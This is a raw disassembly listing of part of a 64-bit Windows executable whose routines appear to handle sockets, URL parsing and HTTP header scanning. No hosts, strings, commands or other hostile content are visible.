   140005e21:	49 8b 5b 28          	mov    0x28(%r11),%rbx
   140005e25:	49 8b 73 30          	mov    0x30(%r11),%rsi
   140005e29:	49 8b 7b 38          	mov    0x38(%r11),%rdi
   140005e2d:	49 8b e3             	mov    %r11,%rsp
   140005e30:	41 5f                	pop    %r15
   140005e32:	41 5e                	pop    %r14
   140005e34:	5d                   	pop    %rbp
   140005e35:	c3                   	ret
   140005e36:	cc                   	int3
   140005e37:	cc                   	int3
   140005e38:	48 83 ec 28          	sub    $0x28,%rsp
   140005e3c:	48 63 c1             	movslq %ecx,%rax
   140005e3f:	48 8d 0d fa 9d 00 00 	lea    0x9dfa(%rip),%rcx        # 0x14000fc40
   140005e46:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140005e4b:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140005e50:	48 8b 4c c1 f8       	mov    -0x8(%rcx,%rax,8),%rcx
   140005e55:	e8 fa 0c 00 00       	call   0x140006b54
   140005e5a:	83 c9 ff             	or     $0xffffffff,%ecx
   140005e5d:	85 c0                	test   %eax,%eax
   140005e5f:	0f 49 4c 24 30       	cmovns 0x30(%rsp),%ecx
   140005e64:	8b c1                	mov    %ecx,%eax
   140005e66:	48 83 c4 28          	add    $0x28,%rsp
   140005e6a:	c3                   	ret
   140005e6b:	cc                   	int3
   140005e6c:	48 83 ec 28          	sub    $0x28,%rsp
   140005e70:	48 63 c1             	movslq %ecx,%rax
   140005e73:	48 8d 0d c6 9d 00 00 	lea    0x9dc6(%rip),%rcx        # 0x14000fc40
   140005e7a:	44 89 44 24 30       	mov    %r8d,0x30(%rsp)
   140005e7f:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   140005e84:	48 8b 4c c1 f8       	mov    -0x8(%rcx,%rax,8),%rcx
   140005e89:	e8 2a 0d 00 00       	call   0x140006bb8
   140005e8e:	83 c9 ff             	or     $0xffffffff,%ecx
   140005e91:	85 c0                	test   %eax,%eax
   140005e93:	0f 49 4c 24 30       	cmovns 0x30(%rsp),%ecx
   140005e98:	8b c1                	mov    %ecx,%eax
   140005e9a:	48 83 c4 28          	add    $0x28,%rsp
   140005e9e:	c3                   	ret
   140005e9f:	cc                   	int3
   140005ea0:	48 83 ec 38          	sub    $0x38,%rsp
   140005ea4:	48 63 c1             	movslq %ecx,%rax
   140005ea7:	48 8d 0d 92 9d 00 00 	lea    0x9d92(%rip),%rcx        # 0x14000fc40
   140005eae:	48 8b 4c c1 f8       	mov    -0x8(%rcx,%rax,8),%rcx
   140005eb3:	48 63 44 24 60       	movslq 0x60(%rsp),%rax
   140005eb8:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140005ebd:	e8 12 0e 00 00       	call   0x140006cd4
   140005ec2:	33 c9                	xor    %ecx,%ecx
   140005ec4:	85 c0                	test   %eax,%eax
   140005ec6:	0f 99 c1             	setns  %cl
   140005ec9:	8d 41 ff             	lea    -0x1(%rcx),%eax
   140005ecc:	48 83 c4 38          	add    $0x38,%rsp
   140005ed0:	c3                   	ret
   140005ed1:	cc                   	int3
   140005ed2:	cc                   	int3
   140005ed3:	cc                   	int3
   140005ed4:	48 83 ec 28          	sub    $0x28,%rsp
   140005ed8:	45 8b c8             	mov    %r8d,%r9d
   140005edb:	44 0f b7 c2          	movzwl %dx,%r8d
   140005edf:	0f b7 d1             	movzwl %cx,%edx
   140005ee2:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   140005ee7:	e8 04 0a 00 00       	call   0x1400068f0
   140005eec:	85 c0                	test   %eax,%eax
   140005eee:	78 2b                	js     0x140005f1b
   140005ef0:	8b 0d 4a dd 00 00    	mov    0xdd4a(%rip),%ecx        # 0x140013c40
   140005ef6:	8b d1                	mov    %ecx,%edx
   140005ef8:	48 8b 44 24 48       	mov    0x48(%rsp),%rax
   140005efd:	81 e2 ff 07 00 00    	and    $0x7ff,%edx
   140005f03:	ff c1                	inc    %ecx
   140005f05:	89 0d 35 dd 00 00    	mov    %ecx,0xdd35(%rip)        # 0x140013c40
   140005f0b:	48 8d 0d 2e 9d 00 00 	lea    0x9d2e(%rip),%rcx        # 0x14000fc40
   140005f12:	48 89 04 d1          	mov    %rax,(%rcx,%rdx,8)
   140005f16:	8d 42 01             	lea    0x1(%rdx),%eax
   140005f19:	eb 03                	jmp    0x140005f1e
   140005f1b:	83 c8 ff             	or     $0xffffffff,%eax
   140005f1e:	48 83 c4 28          	add    $0x28,%rsp
   140005f22:	c3                   	ret
   140005f23:	cc                   	int3
   140005f24:	48 83 ec 28          	sub    $0x28,%rsp
   140005f28:	80 3d 15 dd 00 00 00 	cmpb   $0x0,0xdd15(%rip)        # 0x140013c44
   140005f2f:	74 0c                	je     0x140005f3d
   140005f31:	e8 e2 0a 00 00       	call   0x140006a18
   140005f36:	c6 05 07 dd 00 00 00 	movb   $0x0,0xdd07(%rip)        # 0x140013c44
   140005f3d:	48 83 c4 28          	add    $0x28,%rsp
   140005f41:	c3                   	ret
   140005f42:	cc                   	int3
   140005f43:	cc                   	int3
   140005f44:	45 33 c0             	xor    %r8d,%r8d
   140005f47:	4c 8d 4a fc          	lea    -0x4(%rdx),%r9
   140005f4b:	4d 85 c9             	test   %r9,%r9
   140005f4e:	74 29                	je     0x140005f79
   140005f50:	48 8d 51 02          	lea    0x2(%rcx),%rdx
   140005f54:	80 7a fe 0d          	cmpb   $0xd,-0x2(%rdx)
   140005f58:	75 11                	jne    0x140005f6b
   140005f5a:	80 7a ff 0a          	cmpb   $0xa,-0x1(%rdx)
   140005f5e:	75 0b                	jne    0x140005f6b
   140005f60:	80 3a 0d             	cmpb   $0xd,(%rdx)
   140005f63:	75 06                	jne    0x140005f6b
   140005f65:	80 7a 01 0a          	cmpb   $0xa,0x1(%rdx)
   140005f69:	74 12                	je     0x140005f7d
   140005f6b:	41 ff c0             	inc    %r8d
   140005f6e:	48 ff c2             	inc    %rdx
   140005f71:	49 63 c0             	movslq %r8d,%rax
   140005f74:	49 3b c1             	cmp    %r9,%rax
   140005f77:	72 db                	jb     0x140005f54
   140005f79:	48 8b c1             	mov    %rcx,%rax
   140005f7c:	c3                   	ret
   140005f7d:	49 63 c0             	movslq %r8d,%rax
   140005f80:	48 83 c0 04          	add    $0x4,%rax
   140005f84:	48 03 c1             	add    %rcx,%rax
   140005f87:	c3                   	ret
   140005f88:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140005f8d:	55                   	push   %rbp
   140005f8e:	56                   	push   %rsi
   140005f8f:	57                   	push   %rdi
   140005f90:	41 55                	push   %r13
   140005f92:	41 56                	push   %r14
   140005f94:	48 8d ac 24 70 f2 ff 	lea    -0xd90(%rsp),%rbp
   140005f9b:	ff 
   140005f9c:	48 81 ec 90 0e 00 00 	sub    $0xe90,%rsp
   140005fa3:	48 8b 05 06 58 00 00 	mov    0x5806(%rip),%rax        # 0x14000b7b0
   140005faa:	48 33 c4             	xor    %rsp,%rax
   140005fad:	48 89 85 80 0d 00 00 	mov    %rax,0xd80(%rbp)
   140005fb4:	4c 8b f2             	mov    %rdx,%r14
   140005fb7:	48 8b f9             	mov    %rcx,%rdi
   140005fba:	33 d2                	xor    %edx,%edx
   140005fbc:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140005fc1:	41 b8 10 04 00 00    	mov    $0x410,%r8d
   140005fc7:	e8 b4 14 00 00       	call   0x140007480
   140005fcc:	80 3d 71 dc 00 00 00 	cmpb   $0x0,0xdc71(%rip)        # 0x140013c44
   140005fd3:	0f 84 05 02 00 00    	je     0x1400061de
   140005fd9:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140005fde:	48 8b cf             	mov    %rdi,%rcx
   140005fe1:	e8 06 05 00 00       	call   0x1400064ec
   140005fe6:	84 c0                	test   %al,%al
   140005fe8:	0f 84 f0 01 00 00    	je     0x1400061de
   140005fee:	41 bd 00 08 00 00    	mov    $0x800,%r13d
   140005ff4:	48 8d 8d 80 05 00 00 	lea    0x580(%rbp),%rcx
   140005ffb:	45 8b c5             	mov    %r13d,%r8d
   140005ffe:	33 d2                	xor    %edx,%edx
   140006000:	e8 7b 14 00 00       	call   0x140007480
   140006005:	33 d2                	xor    %edx,%edx
   140006007:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   14000600e:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140006014:	e8 67 14 00 00       	call   0x140007480
   140006019:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000601e:	8b cb                	mov    %ebx,%ecx
   140006020:	e8 bf ba ff ff       	call   0x140001ae4
   140006025:	48 8b d0             	mov    %rax,%rdx
   140006028:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   14000602f:	e8 1a 10 00 00       	call   0x14000704e
   140006034:	80 7c 24 70 00       	cmpb   $0x0,0x70(%rsp)
   140006039:	48 8d 05 e0 16 00 00 	lea    0x16e0(%rip),%rax        # 0x140007720
   140006040:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140006045:	48 0f 44 d0          	cmove  %rax,%rdx
   140006049:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140006050:	e8 f9 0f 00 00       	call   0x14000704e
   140006055:	8d 7b 01             	lea    0x1(%rbx),%edi
   140006058:	8b cf                	mov    %edi,%ecx
   14000605a:	e8 85 ba ff ff       	call   0x140001ae4
   14000605f:	48 8b d0             	mov    %rax,%rdx
   140006062:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140006069:	e8 e0 0f 00 00       	call   0x14000704e
   14000606e:	48 8d 95 80 01 00 00 	lea    0x180(%rbp),%rdx
   140006075:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   14000607c:	e8 cd 0f 00 00       	call   0x14000704e
   140006081:	8d 4b 03             	lea    0x3(%rbx),%ecx
   140006084:	e8 5b ba ff ff       	call   0x140001ae4
   140006089:	48 8b d0             	mov    %rax,%rdx
   14000608c:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140006093:	e8 b6 0f 00 00       	call   0x14000704e
   140006098:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000609b:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   1400060a0:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   1400060a5:	83 64 24 34 00       	andl   $0x0,0x34(%rsp)
   1400060aa:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   1400060af:	48 8d 95 70 01 00 00 	lea    0x170(%rbp),%rdx
   1400060b6:	89 7c 24 30          	mov    %edi,0x30(%rsp)
   1400060ba:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   1400060c1:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   1400060c5:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   1400060ca:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   1400060cf:	e8 e0 fb ff ff       	call   0x140005cb4
   1400060d4:	44 8d 43 05          	lea    0x5(%rbx),%r8d
   1400060d8:	8b d3                	mov    %ebx,%edx
   1400060da:	8b cf                	mov    %edi,%ecx
   1400060dc:	e8 f3 fd ff ff       	call   0x140005ed4
   1400060e1:	bf ff ff 00 00       	mov    $0xffff,%edi
   1400060e6:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   1400060ed:	00 
   1400060ee:	8b d7                	mov    %edi,%edx
   1400060f0:	4c 8d 0d a1 56 00 00 	lea    0x56a1(%rip),%r9        # 0x14000b798
   1400060f7:	41 b8 05 10 00 00    	mov    $0x1005,%r8d
   1400060fd:	8b c8                	mov    %eax,%ecx
   1400060ff:	8b f0                	mov    %eax,%esi
   140006101:	e8 9a fd ff ff       	call   0x140005ea0
   140006106:	4c 8d 0d 8b 56 00 00 	lea    0x568b(%rip),%r9        # 0x14000b798
   14000610d:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140006114:	00 
   140006115:	41 b8 06 10 00 00    	mov    $0x1006,%r8d
   14000611b:	8b d7                	mov    %edi,%edx
   14000611d:	8b ce                	mov    %esi,%ecx
   14000611f:	e8 7c fd ff ff       	call   0x140005ea0
   140006124:	85 f6                	test   %esi,%esi
   140006126:	0f 84 96 00 00 00    	je     0x1400061c2
   14000612c:	44 8d 43 0f          	lea    0xf(%rbx),%r8d
   140006130:	8b ce                	mov    %esi,%ecx
   140006132:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140006137:	e8 50 fb ff ff       	call   0x140005c8c
   14000613c:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000613f:	74 7a                	je     0x1400061bb
   140006141:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140006148:	e8 dd 0e 00 00       	call   0x14000702a
   14000614d:	45 33 c9             	xor    %r9d,%r9d
   140006150:	48 8d 95 80 03 00 00 	lea    0x380(%rbp),%rdx
   140006157:	8b ce                	mov    %esi,%ecx
   140006159:	4c 8d 04 03          	lea    (%rbx,%rax,1),%r8
   14000615d:	e8 0a fd ff ff       	call   0x140005e6c
   140006162:	83 f8 ff             	cmp    $0xffffffff,%eax
   140006165:	74 54                	je     0x1400061bb
   140006167:	eb 3f                	jmp    0x1400061a8
   140006169:	33 c0                	xor    %eax,%eax
   14000616b:	48 8d bd 80 05 00 00 	lea    0x580(%rbp),%rdi
   140006172:	49 8b cd             	mov    %r13,%rcx
   140006175:	48 8d 95 80 05 00 00 	lea    0x580(%rbp),%rdx
   14000617c:	f3 aa                	rep stos %al,(%rdi)
   14000617e:	8b ce                	mov    %esi,%ecx
   140006180:	45 33 c9             	xor    %r9d,%r9d
   140006183:	4d 8b c5             	mov    %r13,%r8
   140006186:	e8 ad fc ff ff       	call   0x140005e38
   14000618b:	8d 48 01             	lea    0x1(%rax),%ecx
   14000618e:	3b cb                	cmp    %ebx,%ecx
   140006190:	76 29                	jbe    0x1400061bb
   140006192:	44 8b c0             	mov    %eax,%r8d
   140006195:	48 8d 95 80 05 00 00 	lea    0x580(%rbp),%rdx
   14000619c:	49 8b ce             	mov    %r14,%rcx
   14000619f:	e8 e8 0b 00 00       	call   0x140006d8c
   1400061a4:	84 c0                	test   %al,%al
   1400061a6:	74 0b                	je     0x1400061b3
   1400061a8:	80 3d a9 56 00 00 00 	cmpb   $0x0,0x56a9(%rip)        # 0x14000b858
   1400061af:	74 b8                	je     0x140006169
   1400061b1:	eb 08                	jmp    0x1400061bb
   1400061b3:	49 8b ce             	mov    %r14,%rcx
   1400061b6:	e8 61 0c 00 00       	call   0x140006e1c
   1400061bb:	8b ce                	mov    %esi,%ecx
   1400061bd:	e8 92 fa ff ff       	call   0x140005c54
   1400061c2:	49 8b ce             	mov    %r14,%rcx
   1400061c5:	e8 4e 0d 00 00       	call   0x140006f18
   1400061ca:	48 85 c0             	test   %rax,%rax
   1400061cd:	74 09                	je     0x1400061d8
   1400061cf:	80 3d 82 56 00 00 00 	cmpb   $0x0,0x5682(%rip)        # 0x14000b858
   1400061d6:	74 02                	je     0x1400061da
   1400061d8:	32 db                	xor    %bl,%bl
   1400061da:	8a c3                	mov    %bl,%al
   1400061dc:	eb 02                	jmp    0x1400061e0
   1400061de:	32 c0                	xor    %al,%al
   1400061e0:	48 8b 8d 80 0d 00 00 	mov    0xd80(%rbp),%rcx
   1400061e7:	48 33 cc             	xor    %rsp,%rcx
   1400061ea:	e8 c1 0e 00 00       	call   0x1400070b0
   1400061ef:	48 8b 9c 24 d0 0e 00 	mov    0xed0(%rsp),%rbx
   1400061f6:	00 
   1400061f7:	48 81 c4 90 0e 00 00 	add    $0xe90,%rsp
   1400061fe:	41 5e                	pop    %r14
   140006200:	41 5d                	pop    %r13
   140006202:	5f                   	pop    %rdi
   140006203:	5e                   	pop    %rsi
   140006204:	5d                   	pop    %rbp
   140006205:	c3                   	ret
   140006206:	cc                   	int3
   140006207:	cc                   	int3
   140006208:	40 55                	rex push %rbp
   14000620a:	53                   	push   %rbx
   14000620b:	56                   	push   %rsi
   14000620c:	57                   	push   %rdi
   14000620d:	41 55                	push   %r13
   14000620f:	41 56                	push   %r14
   140006211:	41 57                	push   %r15
   140006213:	48 8d ac 24 70 f6 ff 	lea    -0x990(%rsp),%rbp
   14000621a:	ff 
   14000621b:	48 81 ec 90 0a 00 00 	sub    $0xa90,%rsp
   140006222:	48 8b 05 87 55 00 00 	mov    0x5587(%rip),%rax        # 0x14000b7b0
   140006229:	48 33 c4             	xor    %rsp,%rax
   14000622c:	48 89 85 80 09 00 00 	mov    %rax,0x980(%rbp)
   140006233:	4d 8b e8             	mov    %r8,%r13
   140006236:	4c 8b fa             	mov    %rdx,%r15
   140006239:	48 8b f9             	mov    %rcx,%rdi
   14000623c:	45 33 f6             	xor    %r14d,%r14d
   14000623f:	33 d2                	xor    %edx,%edx
   140006241:	48 8d 4c 24 70       	lea    0x70(%rsp),%rcx
   140006246:	41 b8 10 04 00 00    	mov    $0x410,%r8d
   14000624c:	41 8b f6             	mov    %r14d,%esi
   14000624f:	e8 2c 12 00 00       	call   0x140007480
   140006254:	44 38 35 e9 d9 00 00 	cmp    %r14b,0xd9e9(%rip)        # 0x140013c44
   14000625b:	0f 84 4a 02 00 00    	je     0x1400064ab
   140006261:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140006266:	48 8b cf             	mov    %rdi,%rcx
   140006269:	e8 7e 02 00 00       	call   0x1400064ec
   14000626e:	84 c0                	test   %al,%al
   140006270:	0f 84 35 02 00 00    	je     0x1400064ab
   140006276:	33 d2                	xor    %edx,%edx
   140006278:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   14000627f:	41 b8 00 02 00 00    	mov    $0x200,%r8d
   140006285:	e8 f6 11 00 00       	call   0x140007480
   14000628a:	41 8d 5e 01          	lea    0x1(%r14),%ebx
   14000628e:	8b cb                	mov    %ebx,%ecx
   140006290:	e8 4f b8 ff ff       	call   0x140001ae4
   140006295:	48 8b d0             	mov    %rax,%rdx
   140006298:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   14000629f:	e8 aa 0d 00 00       	call   0x14000704e
   1400062a4:	44 38 74 24 70       	cmp    %r14b,0x70(%rsp)
   1400062a9:	48 8d 05 70 14 00 00 	lea    0x1470(%rip),%rax        # 0x140007720
   1400062b0:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   1400062b5:	48 0f 44 d0          	cmove  %rax,%rdx
   1400062b9:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   1400062c0:	e8 89 0d 00 00       	call   0x14000704e
   1400062c5:	8d 7b 01             	lea    0x1(%rbx),%edi
   1400062c8:	8b cf                	mov    %edi,%ecx
   1400062ca:	e8 15 b8 ff ff       	call   0x140001ae4
   1400062cf:	48 8b d0             	mov    %rax,%rdx
   1400062d2:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   1400062d9:	e8 70 0d 00 00       	call   0x14000704e
   1400062de:	48 8d 95 80 01 00 00 	lea    0x180(%rbp),%rdx
   1400062e5:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   1400062ec:	e8 5d 0d 00 00       	call   0x14000704e
   1400062f1:	8d 4b 03             	lea    0x3(%rbx),%ecx
   1400062f4:	e8 eb b7 ff ff       	call   0x140001ae4
   1400062f9:	48 8b d0             	mov    %rax,%rdx
   1400062fc:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   140006303:	e8 46 0d 00 00       	call   0x14000704e
   140006308:	33 d2                	xor    %edx,%edx
   14000630a:	48 8d 8d 80 05 00 00 	lea    0x580(%rbp),%rcx
   140006311:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140006317:	e8 64 11 00 00       	call   0x140007480
   14000631c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000631f:	4c 8d 4c 24 60       	lea    0x60(%rsp),%r9
   140006324:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140006329:	4c 8d 44 24 30       	lea    0x30(%rsp),%r8
   14000632e:	48 89 7c 24 30       	mov    %rdi,0x30(%rsp)
   140006333:	48 8d 95 70 01 00 00 	lea    0x170(%rbp),%rdx
   14000633a:	89 5c 24 38          	mov    %ebx,0x38(%rsp)
   14000633e:	48 8d 8d 80 01 00 00 	lea    0x180(%rbp),%rcx
   140006345:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   14000634a:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   14000634f:	e8 60 f9 ff ff       	call   0x140005cb4
   140006354:	45 8d 46 06          	lea    0x6(%r14),%r8d
   140006358:	8b d3                	mov    %ebx,%edx
   14000635a:	8b cf                	mov    %edi,%ecx
   14000635c:	e8 73 fb ff ff       	call   0x140005ed4
   140006361:	bf ff ff 00 00       	mov    $0xffff,%edi
   140006366:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   14000636d:	00 
   14000636e:	8b d7                	mov    %edi,%edx
   140006370:	4c 8d 0d 21 54 00 00 	lea    0x5421(%rip),%r9        # 0x14000b798
   140006377:	41 b8 05 10 00 00    	mov    $0x1005,%r8d
   14000637d:	8b c8                	mov    %eax,%ecx
   14000637f:	44 8b f0             	mov    %eax,%r14d
   140006382:	e8 19 fb ff ff       	call   0x140005ea0
   140006387:	4c 8d 0d 0a 54 00 00 	lea    0x540a(%rip),%r9        # 0x14000b798
   14000638e:	c7 44 24 20 04 00 00 	movl   $0x4,0x20(%rsp)
   140006395:	00 
   140006396:	41 b8 06 10 00 00    	mov    $0x1006,%r8d
   14000639c:	8b d7                	mov    %edi,%edx
   14000639e:	41 8b ce             	mov    %r14d,%ecx
   1400063a1:	e8 fa fa ff ff       	call   0x140005ea0
   1400063a6:	45 85 f6             	test   %r14d,%r14d
   1400063a9:	0f 84 f6 00 00 00    	je     0x1400064a5
   1400063af:	44 8d 46 10          	lea    0x10(%rsi),%r8d
   1400063b3:	41 8b ce             	mov    %r14d,%ecx
   1400063b6:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   1400063bb:	e8 cc f8 ff ff       	call   0x140005c8c
   1400063c0:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400063c3:	0f 84 c6 00 00 00    	je     0x14000648f
   1400063c9:	48 8d 8d 80 03 00 00 	lea    0x380(%rbp),%rcx
   1400063d0:	e8 55 0c 00 00       	call   0x14000702a
   1400063d5:	45 33 c9             	xor    %r9d,%r9d
   1400063d8:	48 8d 95 80 03 00 00 	lea    0x380(%rbp),%rdx
   1400063df:	41 8b ce             	mov    %r14d,%ecx
   1400063e2:	4c 8d 04 03          	lea    (%rbx,%rax,1),%r8
   1400063e6:	e8 81 fa ff ff       	call   0x140005e6c
   1400063eb:	83 f8 ff             	cmp    $0xffffffff,%eax
   1400063ee:	0f 84 9b 00 00 00    	je     0x14000648f
   1400063f4:	40 38 35 5d 54 00 00 	cmp    %sil,0x545d(%rip)        # 0x14000b858
   1400063fb:	0f 85 8e 00 00 00    	jne    0x14000648f
   140006401:	33 c0                	xor    %eax,%eax
   140006403:	48 8d bd 80 05 00 00 	lea    0x580(%rbp),%rdi
   14000640a:	b9 00 04 00 00       	mov    $0x400,%ecx
   14000640f:	48 8d 95 80 05 00 00 	lea    0x580(%rbp),%rdx
   140006416:	f3 aa                	rep stos %al,(%rdi)
   140006418:	41 8b ce             	mov    %r14d,%ecx
   14000641b:	45 33 c9             	xor    %r9d,%r9d
   14000641e:	41 b8 ff 03 00 00    	mov    $0x3ff,%r8d
   140006424:	e8 0f fa ff ff       	call   0x140005e38
   140006429:	83 f8 ff             	cmp    $0xffffffff,%eax
   14000642c:	74 61                	je     0x14000648f
   14000642e:	80 bd 80 05 00 00 00 	cmpb   $0x0,0x580(%rbp)
   140006435:	74 58                	je     0x14000648f
   140006437:	85 c0                	test   %eax,%eax
   140006439:	74 54                	je     0x14000648f
   14000643b:	49 8b cf             	mov    %r15,%rcx
   14000643e:	c6 85 7f 09 00 00 00 	movb   $0x0,0x97f(%rbp)
   140006445:	e8 e0 0b 00 00       	call   0x14000702a
   14000644a:	4d 8b c5             	mov    %r13,%r8
   14000644d:	48 8d 95 80 05 00 00 	lea    0x580(%rbp),%rdx
   140006454:	4c 2b c0             	sub    %rax,%r8
   140006457:	49 8b cf             	mov    %r15,%rcx
   14000645a:	4c 2b c3             	sub    %rbx,%r8
   14000645d:	e8 f8 0b 00 00       	call   0x14000705a
   140006462:	48 8d 8d 80 05 00 00 	lea    0x580(%rbp),%rcx
   140006469:	e8 bc 0b 00 00       	call   0x14000702a
   14000646e:	48 03 f0             	add    %rax,%rsi
   140006471:	49 8d 45 ff          	lea    -0x1(%r13),%rax
   140006475:	48 3b f0             	cmp    %rax,%rsi
   140006478:	73 0f                	jae    0x140006489
   14000647a:	80 3d d7 53 00 00 00 	cmpb   $0x0,0x53d7(%rip)        # 0x14000b858
   140006481:	0f 84 7a ff ff ff    	je     0x140006401
   140006487:	eb 06                	jmp    0x14000648f
   140006489:	43 c6 44 2f ff 00    	movb   $0x0,-0x1(%r15,%r13,1)
   14000648f:	41 8b ce             	mov    %r14d,%ecx
   140006492:	e8 bd f7 ff ff       	call   0x140005c54
   140006497:	48 85 f6             	test   %rsi,%rsi
   14000649a:	74 09                	je     0x1400064a5
   14000649c:	80 3d b5 53 00 00 00 	cmpb   $0x0,0x53b5(%rip)        # 0x14000b858
   1400064a3:	74 02                	je     0x1400064a7
   1400064a5:	32 db                	xor    %bl,%bl
   1400064a7:	8a c3                	mov    %bl,%al
   1400064a9:	eb 02                	jmp    0x1400064ad
   1400064ab:	32 c0                	xor    %al,%al
   1400064ad:	48 8b 8d 80 09 00 00 	mov    0x980(%rbp),%rcx
   1400064b4:	48 33 cc             	xor    %rsp,%rcx
   1400064b7:	e8 f4 0b 00 00       	call   0x1400070b0
   1400064bc:	48 81 c4 90 0a 00 00 	add    $0xa90,%rsp
   1400064c3:	41 5f                	pop    %r15
   1400064c5:	41 5e                	pop    %r14
   1400064c7:	41 5d                	pop    %r13
   1400064c9:	5f                   	pop    %rdi
   1400064ca:	5e                   	pop    %rsi
   1400064cb:	5b                   	pop    %rbx
   1400064cc:	5d                   	pop    %rbp
   1400064cd:	c3                   	ret
   1400064ce:	cc                   	int3
   1400064cf:	cc                   	int3
   1400064d0:	48 83 ec 28          	sub    $0x28,%rsp
   1400064d4:	e8 33 06 00 00       	call   0x140006b0c
   1400064d9:	85 c0                	test   %eax,%eax
   1400064db:	0f 99 c0             	setns  %al
   1400064de:	88 05 60 d7 00 00    	mov    %al,0xd760(%rip)        # 0x140013c44
   1400064e4:	48 83 c4 28          	add    $0x28,%rsp
   1400064e8:	c3                   	ret
   1400064e9:	cc                   	int3
   1400064ea:	cc                   	int3
   1400064eb:	cc                   	int3
   1400064ec:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   1400064f1:	48 89 6c 24 20       	mov    %rbp,0x20(%rsp)
   1400064f6:	56                   	push   %rsi
   1400064f7:	57                   	push   %rdi
   1400064f8:	41 56                	push   %r14
   1400064fa:	48 81 ec 50 04 00 00 	sub    $0x450,%rsp
   140006501:	48 8b 05 a8 52 00 00 	mov    0x52a8(%rip),%rax        # 0x14000b7b0
   140006508:	48 33 c4             	xor    %rsp,%rax
   14000650b:	48 89 84 24 40 04 00 	mov    %rax,0x440(%rsp)
   140006512:	00 
   140006513:	48 8b fa             	mov    %rdx,%rdi
   140006516:	48 8b d9             	mov    %rcx,%rbx
   140006519:	33 d2                	xor    %edx,%edx
   14000651b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006520:	41 b8 00 04 00 00    	mov    $0x400,%r8d
   140006526:	e8 55 0f 00 00       	call   0x140007480
   14000652b:	ba ff 03 00 00       	mov    $0x3ff,%edx
   140006530:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006535:	44 8b ca             	mov    %edx,%r9d
   140006538:	4c 8b c3             	mov    %rbx,%r8
   14000653b:	e8 32 0b 00 00       	call   0x140007072
   140006540:	0f 57 c0             	xorps  %xmm0,%xmm0
   140006543:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140006548:	33 c0                	xor    %eax,%eax
   14000654a:	0f 11 44 24 20       	movups %xmm0,0x20(%rsp)
   14000654f:	89 44 24 30          	mov    %eax,0x30(%rsp)
   140006553:	e8 d2 0a 00 00       	call   0x14000702a
   140006558:	4c 8d 74 24 40       	lea    0x40(%rsp),%r14
   14000655d:	48 8d 15 9c 11 00 00 	lea    0x119c(%rip),%rdx        # 0x140007700
   140006564:	4c 03 f0             	add    %rax,%r14
   140006567:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   14000656c:	e8 ef 0a 00 00       	call   0x140007060
   140006571:	48 85 c0             	test   %rax,%rax
   140006574:	48 8d 6c 24 40       	lea    0x40(%rsp),%rbp
   140006579:	ba 3a 00 00 00       	mov    $0x3a,%edx
   14000657e:	48 8d 48 02          	lea    0x2(%rax),%rcx
   140006582:	48 0f 45 e9          	cmovne %rcx,%rbp
   140006586:	48 8b cd             	mov    %rbp,%rcx
   140006589:	e8 de 0a 00 00       	call   0x14000706c
   14000658e:	ba 2f 00 00 00       	mov    $0x2f,%edx
   140006593:	48 8b cd             	mov    %rbp,%rcx
   140006596:	48 8b f0             	mov    %rax,%rsi
   140006599:	e8 ce 0a 00 00       	call   0x14000706c
   14000659e:	48 8b d8             	mov    %rax,%rbx
   1400065a1:	48 85 c0             	test   %rax,%rax
   1400065a4:	75 05                	jne    0x1400065ab
   1400065a6:	49 8b de             	mov    %r14,%rbx
   1400065a9:	eb 13                	jmp    0x1400065be
   1400065ab:	ba ff 01 00 00       	mov    $0x1ff,%edx
   1400065b0:	4c 8b c0             	mov    %rax,%r8
